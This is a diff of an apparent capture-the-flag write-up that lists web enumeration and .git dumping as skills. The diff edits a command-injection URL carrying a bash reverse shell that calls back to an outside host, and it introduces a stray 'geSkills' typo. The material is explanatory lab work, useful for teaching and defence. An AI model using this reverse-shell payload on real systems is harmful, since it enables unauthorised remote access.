@@ -1,4 +1,4 @@
-Skills
+geSkills
 
 - Web Enumeration
 - Extracting the contents of .git directory - GitDumper
@@ -318,7 +318,7 @@ Now , of course if we can do this type of commands, we can try to get in to the 
 
 bash -i means (interactive)
 ```
-http://172.16.2.184/?cmd=bash -c "bash -i >%26 /dev/tcp/172.16.0.140/443 0>%261"
+http://172.16.2.184/?cmd=bash -c "bash -i >& /dev/tcp/172.16.0.140/443 0>&1"
 ```
 Now we're in
 
